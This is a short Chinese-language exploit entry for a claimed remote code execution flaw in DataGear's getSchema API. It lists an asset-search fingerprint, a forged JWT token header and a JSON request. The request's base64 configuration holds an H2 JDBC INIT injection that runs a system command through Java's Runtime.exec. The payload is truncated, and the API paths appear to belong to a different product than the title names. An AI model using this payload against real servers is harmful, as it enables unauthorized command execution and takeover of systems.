# DataGear平台getSchema存在远程代码执行漏洞

- **系统**：DataGear　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="changeThemeData?theme="`
- **请求**：`POST /de2api/datasource/getSchema HTTP/1.1`
- **关键头**：`X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8`

**请求体 / payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: application/json
"id": "",
"name": "11",
"description": "",
"type": "h2",
"apiConfiguration": [],
"paramsConfiguration": [],
"enableDataFill": false,
"configuration": "eyJkYXRhQmFzZSI6IiIsImpkYmMiOiJqZGJjOmgyOm1lbTp0ZXN0O2luXFxpdD1EUk9QIEFMSUFTIElGIEVYSVNUUyBFWEVDXFw7Q1JFQVRcXEUgQUxJQVMgRVhFQyBBUyAkJHZvaWQgZXhlYygpIHRocm93cyBFeGNlcHRpb24ge2phdmEubGFuZy5TdHJpbmcgcyA9IG5ldyBqYXZhLnV0aWwuU2Nhbm5lcihqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhcImVjaG8gdGVzdDEyM1wiKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoXCJcXEFcIikubmV4dCgpXFw7dGhy…（脚本共 943 字，完整版见原文）
```
- **预期**：200　|　test